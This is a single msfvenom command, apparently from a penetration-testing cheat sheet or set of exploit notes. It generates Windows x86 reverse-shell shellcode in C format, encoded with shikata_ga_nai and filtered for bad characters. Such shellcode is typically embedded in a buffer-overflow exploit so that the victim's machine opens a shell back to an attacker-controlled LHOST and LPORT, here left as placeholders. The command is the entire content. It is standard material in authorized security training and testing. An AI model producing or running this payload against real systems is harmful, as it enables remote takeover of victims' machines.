~~~~
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai 
~~~~
